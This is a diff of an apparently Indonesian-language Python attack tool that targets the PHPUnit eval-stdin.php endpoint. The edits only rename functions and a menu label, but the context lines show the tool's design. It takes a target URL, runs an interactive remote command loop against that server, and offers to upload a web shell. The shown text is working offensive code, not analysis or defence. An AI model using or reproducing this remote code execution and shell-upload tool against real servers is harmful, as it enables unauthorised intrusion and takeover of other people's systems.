@@ -33,7 +33,7 @@ def clear():
     except Exception as e:
         print("Terjadi Kesalahan.", e)
 
-def payloadCMD(target):
+def NuLzCMD(target):
     while True:
         input_cmd = input('CMD ~$: ')
         cmd = input_cmd.lower()
@@ -46,7 +46,7 @@ def payloadCMD(target):
         res = req.text
         print(res)
 
-def payloadUPSHELL(target):
+def NuLzUPSHELL(target):
     url = target
     pattern = re.compile(r'PHP/([^/]+)')
     match = pattern.search(url)
@@ -66,7 +66,7 @@ def nulzGG():
     print('Target Example: https://domain.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
     target = input('TARGET >: ')
     print('''
-[ Select Payload ]
+[ Select Option ]
 --------------------------
 [1] RCE (Command)
 [2] UPSHELL (Upload Shell)
@@ -77,9 +77,9 @@ def nulzGG():
         try:
             selected_payload = int(select_payload)
             if selected_payload == 1:
-                payloadCMD(target)
+                NuLzCMD(target)
             elif selected_payload == 2:
-                payloadUPSHELL(target)
+                NuLzUPSHELL(target)
         except ValueError:
             print('Mohon Masukan Pilihan Dengan Benar')
     else:
